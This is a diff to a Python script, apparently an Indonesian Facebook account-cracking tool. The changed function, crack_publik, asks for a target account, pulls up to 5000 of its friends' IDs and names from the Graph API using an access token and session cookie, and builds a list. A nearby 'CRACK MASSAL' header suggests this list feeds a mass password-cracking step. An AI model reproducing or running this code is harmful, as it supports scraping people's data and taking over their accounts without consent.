@@ -242,16 +242,17 @@ def crack_publik():
 	print()
 	aink_gabut = input(f'{K} [{P}•{K}]{P} Target : ')
 	try:
-	         params = {
-			"access_token": token, 
-			"fields": "name,friends.fields(id,name,birthday)"
-			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			print('>> Total Idz : {}'.format(len(id)));setting()
-		except Exception as e:
-			print(e)
+		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+		for ricode_bang in aink_raka['friends']['data']:
+			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
+			except:continue
+		__raka_andrian___(f'{K} [{P}•{K}]{P} Total  : '+str(len(id)))
+		perintah()
+	except requests.exceptions.ConnectionError:
+		__raka_andrian___(f'{K} [{P}•{K}]{P} Koneksi Internet Bermasalah')
+	except (KeyError,IOError):
+		__raka_andrian___(f'{K} [{P}•{K}]{P} Pertemanan Tidak Publik ')
+		exit()
 # * [ CRACK MASSAL ] * #
 def dump():    
 	try:
